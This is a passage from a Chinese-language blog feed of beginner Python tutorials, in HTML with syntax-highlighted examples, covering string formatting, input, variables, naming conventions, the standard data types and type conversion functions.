class="hljs-title">str</span>(<span class="hljs-variable">age</span>))</span><br></code></pre></td></tr></table></figure><p>此时可以使用str.format()输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#123;&#125;网址： &quot;&#123;&#125;!&quot;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;菜鸟教程&#x27;</span>, <span class="hljs-string">&#x27;www.runoob.com&#x27;</span>))<br>菜鸟教程网址： <span class="hljs-string">&quot;www.runoob.com!&quot;</span><br></code></pre></td></tr></table></figure><p>括号及其里面的字符 (称作格式化字段) 将会被 format() 中的参数替换。 </p><p>在括号中的数字用于指向传入对象在 format() 中的位置，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>**<span class="hljs-built_in">print</span>**(<span class="hljs-string">&#x27;&#123;0&#125; 和 &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>))<br> Google 和 Runoob<br> &gt;&gt;&gt; **<span class="hljs-built_in">print</span>**(<span class="hljs-string">&#x27;&#123;1&#125; 和 &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>))<br> Runoob 和 Google<br></code></pre></td></tr></table></figure><p>如果在 format() 中使用了关键字参数, 那么它们的值会指向使用该名字的参数。</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">**<span class="hljs-built_in">print</span>**(<span class="hljs-string">&#x27;&#123;name&#125;网址： &#123;site&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name=<span class="hljs-string">&#x27;菜鸟教程&#x27;</span>, site=<span class="hljs-string">&#x27;www.runoob.com&#x27;</span>))</span><br>菜鸟教程网址： www.runoob.com<br></code></pre></td></tr></table></figure><p>位置及关键字参数可以任意的结合:</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">**<span class="hljs-built_in">print</span>**(<span class="hljs-string">&#x27;站点列表 &#123;0&#125;, &#123;1&#125;, 和 &#123;other&#125;。&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-string">&#x27;Runoob&#x27;</span>, other=<span class="hljs-string">&#x27;Taobao&#x27;</span>))</span><br>站点列表 Google, Runoob, 和 Taobao。<br></code></pre></td></tr></table></figure><p>也可以使用字符串格式化，% 操作符也可以实现字符串格式化。 它将左边的参数作为类似 <strong>sprintf()</strong> 式的格式化字符串, 而将右边的代入, 然后返回格式化后的字符串. 例如:</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%A0%BC%E5%BC%8F%E5%8C%96.png" alt="字符串格式化"></p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p><code>input()</code>从标准输入读入一行文本，默认的标准输入是键盘。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%BE%93%E5%85%A5.png" alt="输入"></p><p><em><strong>注意：<code>input()</code>函数返回的是string类型</strong></em></p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python基础-2(python变量)</title>
    <link href="/2023/12/01/python%E5%9F%BA%E7%A1%80-2(python%E5%8F%98%E9%87%8F)/"/>
    <url>/2023/12/01/python%E5%9F%BA%E7%A1%80-2(python%E5%8F%98%E9%87%8F)/</url>
    
    <content type="html"><![CDATA[<h2 id="python变量"><a href="#python变量" class="headerlink" title="python变量"></a>python变量</h2><h3 id="变量的意义"><a href="#变量的意义" class="headerlink" title="变量的意义"></a>变量的意义</h3><p>在很多重复输入的语句中，如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;你好&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;你好&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;你好&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;你好&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;你好&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>一直打重复的‘你好’过程枯燥且没有意义，这时就可以使用变量来保存‘你好’字段这样就可以使用变量代替‘你好’输出。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Hi = <span class="hljs-string">&#x27;你好&#x27;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(Hi)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(Hi)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(Hi)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(Hi)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(Hi)</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%BD%A0%E5%A5%BD%E8%BE%93%E5%87%BA.png" alt="你好输出"></p><p><strong>虽然不使用变量也可以输出，但是如果需要修改‘你好’的字段就非常麻烦，若是要反复修改那工作量简直无法想象。而上述问题使用变量就很容易解决，将字段赋值给变量，只要将赋值改变后方的输出就能全部修改减少大量无用的工作。</strong></p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">变量名 <span class="hljs-operator">=</span> 变量的值<br>变量<span class="hljs-number">1</span>，变量<span class="hljs-number">2</span>，变量<span class="hljs-number">3</span> <span class="hljs-operator">=</span> 变量的值<span class="hljs-number">1</span>，变量的值<span class="hljs-number">2</span>，变量的值<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="python命名规范"><a href="#python命名规范" class="headerlink" title="python命名规范"></a>python命名规范</h3><p><strong>所有命名规范都要准守这三条</strong> </p><p>1.命名只能有数字、字母和_，且只能以字母或者_下划线开头</p><p>2.名字严格区分大小写</p><p>3.名字不能与关键字重合</p><p><strong>命名风格</strong></p><p>变量命名可以使用大驼峰命名法或小驼峰命名法</p><ul><li><p>大驼峰式命名法（upper camel case）：<br> 每一个单字的首字母都采用大写字母，例如：FirstName、LastName、CamelCase，也被称为 Pascal 命名法。</p></li><li><p>小驼峰式命名法（lower camel case）：<br> 第一个单字以小写字母开始，第二个单字的首字母大写。例如：firstName、lastName。</p></li></ul><h3 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h3><p>Python3 中常见的数据类型有：</p><ul><li>Number（数字）</li><li>String（字符串）</li><li>bool（布尔类型）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ul><p>Python3 的六个标准数据类型中：</p><ul><li><strong>不可变数据（3 个）：</strong>Number（数字）、String（字符串）、Tuple（元组）；</li><li><strong>可变数据（3 个）：</strong>List（列表）、Dictionary（字典）、Set（集合）。</li></ul><p>此外还有一些高级的数据类型，如: 字节数组类型(bytes)。</p><h4 id="Number（数字）"><a href="#Number（数字）" class="headerlink" title="Number（数字）"></a>Number（数字）</h4><p>Python3 支持 <strong>int、float、bool、complex（复数,基本不使用）</strong>。</p><p>在Python 3里，只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</p><p>像大多数语言一样，数值类型的赋值和计算都是很直观的。</p><p>内置的 type() 函数可以用来查询变量所指的对象类型。<br>当你指定一个值时，Number 对象就会被创建：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">var1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">var2</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><p>您也可以使用del语句删除一些对象引用。</p><p>del语句的语法是：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">del var1<span class="hljs-comment">[,var2<span class="hljs-comment">[,var3<span class="hljs-comment">[....,varN]</span>]</span>]</span><br></code></pre></td></tr></table></figure><p>您可以通过使用del语句删除单个或多个对象。例如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">del</span> <span class="hljs-selector-tag">var</span><br><span class="hljs-selector-tag">del</span> var_a, var_b<br></code></pre></td></tr></table></figure><p>数值运算</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">5</span> + <span class="hljs-number">4</span>  <span class="hljs-comment"># 加法</span></span><br>9<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">4.3</span> - <span class="hljs-number">2</span> <span class="hljs-comment"># 减法</span></span><br>2.3<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">3</span> * <span class="hljs-number">7</span>  <span class="hljs-comment"># 乘法</span></span><br>21<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">2</span> / <span class="hljs-number">4</span>  <span class="hljs-comment"># 除法，得到一个浮点数</span></span><br>0.5<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">2</span> // <span class="hljs-number">4</span> <span class="hljs-comment"># 除法，得到一个整数</span></span><br>0<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">17</span> % <span class="hljs-number">3</span> <span class="hljs-comment"># 取余 </span></span><br>2<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">2</span> ** <span class="hljs-number">5</span> <span class="hljs-comment"># 乘方</span></span><br>32<br></code></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>1、Python可以同时为多个变量赋值，如a, b &#x3D; 1, 2。</li><li>2、一个变量可以通过赋值指向不同类型的对象。</li><li>3、数值的除法包含两个运算符：&#x2F; 返回一个浮点数，&#x2F;&#x2F; 返回一个整数。</li><li>4、在混合计算时，Python会把整型转换成为浮点数。</li></ul><h4 id="String（字符串）"><a href="#String（字符串）" class="headerlink" title="String（字符串）"></a>String（字符串）</h4><p>Python中的字符串用单引号 ‘ 或双引号 “ 括起来，同时使用反斜杠 \ 转义特殊字符。</p><p>字符串的截取的语法格式如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">变量<span class="hljs-selector-attr">[头下标:尾下标]</span><br></code></pre></td></tr></table></figure><p>索引值以 0 为开始值，-1 为从末尾的开始位置。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img123456-20200923-1.svg" alt="img"></p><p>加号  +  是字符串的连接符， 星号  *  表示复制当前字符串，与之结合的数字为复制的次数。实例如下：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;Runoob&#x27;</span><br><br><span class="hljs-keyword">print</span> (<span class="hljs-built_in">str</span>)          <span class="hljs-meta"># 输出字符串</span><br><span class="hljs-keyword">print</span> (<span class="hljs-built_in">str</span>[<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>])    <span class="hljs-meta"># 输出第一个到倒数第二个的所有字符</span><br><span class="hljs-keyword">print</span> (<span class="hljs-built_in">str</span>[<span class="hljs-number">0</span>])       <span class="hljs-meta"># 输出字符串第一个字符</span><br><span class="hljs-keyword">print</span> (<span class="hljs-built_in">str</span>[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>])     <span class="hljs-meta"># 输出从第三个开始到第五个的字符</span><br><span class="hljs-keyword">print</span> (<span class="hljs-built_in">str</span>[<span class="hljs-number">2</span>:])      <span class="hljs-meta"># 输出从第三个开始的后的所有字符</span><br><span class="hljs-keyword">print</span> (<span class="hljs-built_in">str</span> * <span class="hljs-number">2</span>)      <span class="hljs-meta"># 输出字符串两次，也可以写成 print (2 * str) </span><br><span class="hljs-keyword">print</span> (<span class="hljs-built_in">str</span> + <span class="hljs-string">&quot;TEST&quot;</span>) <span class="hljs-meta"># 连接字符串</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B4%A2%E5%BC%95.png" alt="字符串索引"></p><p>Python 使用反斜杠 \ 转义特殊字符，如果你不想让反斜杠发生转义，可以在字符串前面添加一个 r，表示原始字符串：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%E5%92%8Cr.png" alt="转义字符和r"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%B4%A2%E5%BC%951.png" alt="索引1"></p><p>另外，反斜杠()可以作为续行符，表示下一行是上一行的延续。也可以使用 <strong>“””…”””</strong> 或者 <strong>‘’’…’’’</strong> 跨越多行。</p><p>注意，Python 没有单独的字符类型，一个字符就是长度为1的字符串。</p><p>与 C 字符串不同的是，Python 字符串不能被改变。向一个索引位置赋值，比如 word[0] &#x3D; ‘m’ 会导致错误。</p><p><strong>注意：</strong></p><ul><li>1、反斜杠可以用来转义，使用r可以让反斜杠不发生转义。</li><li>2、字符串可以用+运算符连接在一起，用*运算符重复。</li><li>3、Python中的字符串有两种索引方式，从左往右以0开始，从右往左以-1开始。</li><li>4、Python中的字符串不能改变。</li></ul><h4 id="bool（布尔类型）"><a href="#bool（布尔类型）" class="headerlink" title="bool（布尔类型）"></a>bool（布尔类型）</h4><p>布尔类型即 True 或 False。</p><p>在 Python 中，True 和 False 都是关键字，表示布尔值。</p><p>布尔类型可以用来控制程序的流程，比如判断某个条件是否成立，或者在某个条件满足时执行某段代码。</p><p>布尔类型特点：</p><ul><li>布尔类型只有两个值：True 和 False。</li><li>布尔类型可以和其他数据类型进行比较，比如数字、字符串等。在比较时，Python 会将 True 视为 1，False 视为 0。</li><li>布尔类型可以和逻辑运算符一起使用，包括 and、or 和 not。这些运算符可以用来组合多个布尔表达式，生成一个新的布尔值。</li><li>布尔类型也可以被转换成其他数据类型，比如整数、浮点数和字符串。在转换时，True 会被转换成 1，False 会被转换成 0。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgBool%E7%9A%84%E5%BA%94%E7%94%A8.png" alt="Bool的应用"></p><p><strong>注意:</strong> 在 Python 中，所有非零的数字和非空的字符串、列表、元组等数据类型都被视为 True，只有 <strong>0、空字符串、空列表、空元组</strong>等被视为 False。因此，在进行布尔类型转换时，需要注意数据类型的真假性。</p><h4 id="List（列表）"><a href="#List（列表）" class="headerlink" title="List（列表）"></a>List（列表）</h4><p>List（列表） 是 Python 中使用最频繁的数据类型。</p><p>列表可以完成大多数集合类的数据结构实现。列表中元素的类型可以不相同，它支持数字，字符串甚至可以包含列表（所谓嵌套）。</p><p>列表是写在方括号 [] 之间、用逗号分隔开的元素列表。</p><p>和字符串一样，列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表。</p><p>列表截取的语法格式如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">变量<span class="hljs-selector-attr">[头下标:尾下标]</span><br></code></pre></td></tr></table></figure><p>索引值以 0 为开始值，-1 为从末尾的开始位置。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imglist_slicing1_new1.png" alt="img"></p><p>加号 + 是列表连接运算符，星号 * 是重复操作。如下实例：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imglist%E7%9A%84%E5%BA%94%E7%94%A8.png" alt="list的应用"></p><p>与Python字符串不一样的是，列表中的元素是可以改变的：</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a[<span class="hljs-number">0</span>] = <span class="hljs-number">9</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>] = [<span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a</span><br>[9, 2, 13, 14, 15, 6]<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>] = []   <span class="hljs-comment"># 将对应的元素值设置为 [] </span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">a</span><br>[9, 2, 6]<br></code></pre></td></tr></table></figure><p>List 内置了有很多方法，例如 append()、pop() 等等，这在后面会讲到。</p><p><strong>注意：</strong></p><ul><li>1、List写在方括号之间，元素用逗号隔开。</li><li>2、和字符串一样，list可以被索引和切片。</li><li>3、List可以使用+操作符进行拼接。</li><li>4、List中的元素是可以改变的。</li></ul><p>Python 列表截取可以接收第三个参数，参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgpy-dict-1.png" alt="img"></p><h4 id="Tuple（元组）"><a href="#Tuple（元组）" class="headerlink" title="Tuple（元组）"></a>Tuple（元组）</h4><p>元组（tuple）与列表类似，不同之处在于元组的元素不能修改。元组写在小括号 () 里，元素之间用逗号隔开。</p><p>元组中的元素类型也可以不相同：</p><p>元组（tuple）与列表类似，不同之处在于元组的元素不能修改。元组写在小括号 () 里，元素之间用逗号隔开。</p><p>元组中的元素类型也可以不相同：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgtuple%E7%9A%84%E5%BA%94%E7%94%A8.png" alt="tuple的应用"></p><p>元组与字符串类似，可以被索引且下标索引从0开始，-1 为从末尾开始的位置。也可以进行截取（看上面，这里不再赘述）。</p><p>其实，可以把字符串看作一种特殊的元组。</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tup = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(tup[<span class="hljs-number">0</span>])</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(tup[<span class="hljs-number">1</span>:<span class="hljs-number">5</span>])</span><br>(2, 3, 4, 5)<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">tup[<span class="hljs-number">0</span>] = <span class="hljs-number">11</span>  <span class="hljs-comment"># 修改元组元素的操作是非法的</span></span><br>Traceback (most recent call last):<br>  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;<br>TypeError: &#x27;tuple&#x27; object does not support item assignment<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span><br></code></pre></td></tr></table></figure><p>虽然tuple的元素不可改变，但它可以包含可变的对象，比如list列表。</p><p>构造包含 0 个或 1 个元素的元组比较特殊，所以有一些额外的语法规则：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tup1</span> = ()    <span class="hljs-comment"># 空元组</span><br><span class="hljs-attr">tup2</span> = (<span class="hljs-number">20</span>,) <span class="hljs-comment"># 一个元素，需要在元素后添加逗号</span><br></code></pre></td></tr></table></figure><p>string、list 和 tuple 都属于 sequence（序列）。</p><p><strong>注意：</strong></p><ul><li>1、与字符串一样，元组的元素不能修改。</li><li>2、元组也可以被索引和切片，方法一样。</li><li>3、注意构造包含 0 或 1 个元素的元组的特殊语法规则。</li><li>4、元组也可以使用+操作符进行拼接。</li></ul><h4 id="Dictionary（字典）"><a href="#Dictionary（字典）" class="headerlink" title="Dictionary（字典）"></a>Dictionary（字典）</h4><p>字典（dictionary）是Python中另一个非常有用的内置数据类型。</p><p>列表是有序的对象集合，字典是无序的对象集合。两者之间的区别在于：字典当中的元素是通过键来存取的，而不是通过偏移存取。</p><p>字典是一种映射类型，字典用 { } 标识，它是一个无序的 <strong>键(key) : 值(value)</strong> 的集合。</p><p>键(key)必须使用不可变类型。</p><p>在同一个字典中，键(key)必须是唯一的。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgdict%E7%9A%84%E4%BD%BF%E7%94%A8.png" alt="dict的使用"></p><p>构造函数 dict() 可以直接从键值对序列中构建字典如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&gt;&gt;&gt; <span class="hljs-title function_">dict</span>(<span class="hljs-params">[(<span class="hljs-string">&#x27;Runoob&#x27;</span>, <span class="hljs-number">1</span>), (<span class="hljs-string">&#x27;Google&#x27;</span>, <span class="hljs-number">2</span>), (<span class="hljs-string">&#x27;Taobao&#x27;</span>, <span class="hljs-number">3</span>)]</span>)<br>&#123;<span class="hljs-string">&#x27;Runoob&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;Google&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;Taobao&#x27;</span>: <span class="hljs-number">3</span>&#125;<br>&gt;&gt;&gt; &#123;<span class="hljs-attr">x</span>: x**<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> (<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>)&#125;<br>&#123;<span class="hljs-number">2</span>: <span class="hljs-number">4</span>, <span class="hljs-number">4</span>: <span class="hljs-number">16</span>, <span class="hljs-number">6</span>: <span class="hljs-number">36</span>&#125;<br>&gt;&gt;&gt; <span class="hljs-title function_">dict</span>(<span class="hljs-params">Runoob=<span class="hljs-number">1</span>, Google=<span class="hljs-number">2</span>, Taobao=<span class="hljs-number">3</span></span>)<br>&#123;<span class="hljs-string">&#x27;Runoob&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;Google&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;Taobao&#x27;</span>: <span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure><p>另外，字典类型也有一些内置的函数，例如 clear()、keys()、values() 等。</p><p><strong>注意：</strong></p><ul><li>1、字典是一种映射类型，它的元素是键值对。</li><li>2、字典的关键字必须为不可变类型，且不能重复。</li><li>3、创建空字典使用 **{ }**。</li></ul><hr><h2 id="Python数据类型转换"><a href="#Python数据类型转换" class="headerlink" title="Python数据类型转换"></a>Python数据类型转换</h2><p><code>type()</code>显示所输入的数据的数据类型类型，如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span> = <span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(a)</span></span>)  <span class="hljs-comment">//打印a的数据类型</span><br></code></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可。</p><p>以下几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>int(x)</td><td>将x转换为一个整数</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-float.html">float(x)</a></td><td>将x转换到一个浮点数</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-str.html">str(x)</a></td><td>将对象 x 转换为字符串</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-repr.html">repr(x)</a></td><td>将对象 x 转换为表达式字符串</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-eval.html">eval(str)</a></td><td>用来计算在字符串中的有效Python表达式,并返回一个对象</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-func-tuple.html">tuple(s)</a></td><td>将序列 s 转换为一个元组</td></tr><tr><td><a href="https://www.runoob.com/python3/python3-att-list-list.html">list(s)</a></td><td>将序列 s 转换为一个列表</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-set.html">set(s)</a></td><td>转换为可变集合</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-dict.html">dict(d)</a></td><td>创建一个字典。d 必须是一个 (key, value)元组序列。</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-frozenset.html">frozenset(s)</a></td><td>转换为不可变集合</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-chr.html">chr(x)</a></td><td>将一个整数转换为一个字符</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-ord.html">ord(x)</a></td><td>将一个字符转换为它的整数值</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-hex.html">hex(x)</a></td><td>将一个整数转换为一个十六进制字符串</td></tr><tr><td><a href="https://www.runoob.com/python3/python-func-oct.html">oct(x)</a></td><td>将一个整数转换为一个八进制字符串</td></tr></tbody></table><p><strong>注意：</strong></p><ul><li><p>使用int()转换时需注意输入的数据不能带有非法的字符，如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span>,<span class="hljs-selector-tag">b</span> = <span class="hljs-string">&#x27;1.23&#x27;</span>,<span class="hljs-string">&#x27;12ab&#x27;</span>   <span class="hljs-selector-id">#a</span>,b都是字符串类型<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(int(a)</span></span>)    #语句都会报错<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(int(b)</span></span>) <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgint()%E8%BD%AC%E6%8D%A2.png" alt="int()转换"></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span 